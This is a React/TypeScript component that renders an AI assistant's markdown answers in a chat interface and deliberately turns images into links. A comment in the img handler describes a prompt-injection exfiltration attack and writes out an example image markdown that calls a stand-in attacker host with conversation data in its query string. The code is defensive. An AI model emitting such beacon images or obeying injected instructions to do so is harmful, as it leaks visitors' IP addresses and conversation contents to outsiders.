/* An assistant's answer, rendered from its markdown: in the hosted chat,
 * and in an agent's Try it, which showed the answer's `**` and `- ` as
 * text. Raw HTML is skipped, and images become links (see `img` below). */
import { lazy, Suspense } from 'react'
import type { Components } from 'react-markdown'

const ReactMarkdown = lazy(() => import('react-markdown'))

export function AssistantMarkdown({ children }: { children: string }) {
  return (
    <Suspense fallback={<span className="whitespace-pre-wrap">{children}</span>}>
      <ReactMarkdown skipHtml components={assistantMarkdownComponents}>
        {children}
      </ReactMarkdown>
    </Suspense>
  )
}

export const assistantMarkdownComponents: Components = {
  p: ({ children }) => <p className="mb-3 last:mb-0">{children}</p>,
  ul: ({ children }) => <ul className="mb-3 list-disc space-y-1 pl-5 last:mb-0">{children}</ul>,
  ol: ({ children }) => <ol className="mb-3 list-decimal space-y-1 pl-5 last:mb-0">{children}</ol>,
  li: ({ children }) => <li>{children}</li>,
  a: ({ children, href }) => (
    <a
      href={href}
      target="_blank"
      rel="noopener noreferrer"
      className="underline underline-offset-2"
    >
      {children}
    </a>
  ),
  // Assistant output is untrusted. Anyone who can steer the agent -- a
  // prompt injection planted in a web page it reads, a hostile tool
  // result, or a visitor who simply asks for it -- can make it emit
  // `![](https://attacker.example/x.png?d=...)`. Rendering that as a real
  // <img> makes the visitor's browser fetch the attacker's URL the instant
  // the bubble paints: a zero-click beacon that leaks the visitor's IP and
  // user agent, with conversation text encodable in the query string.
  // Show the reference as a link the visitor has to choose to follow.
  // (`src` has already been through react-markdown's default URL
  // transform, so the scheme is http/https.)
  img: ({ src, alt }) => (
    <a
      href={typeof src === 'string' ? src : undefined}
      target="_blank"
      rel="noopener noreferrer"
      className="underline underline-offset-2"
    >
      {alt || 'image'}
    </a>
  ),
  code: ({ children }) => (
    <code className="rounded bg-background/70 px-1 py-0.5 font-mono text-[0.9em]">{children}</code>
  ),
  pre: ({ children }) => (
    <pre className="mb-3 overflow-x-auto rounded-lg bg-background/70 p-3 last:mb-0">{children}</pre>
  ),
  blockquote: ({ children }) => (
    <blockquote className="mb-3 border-l-2 border-current/30 pl-3 last:mb-0">{children}</blockquote>
  ),
}
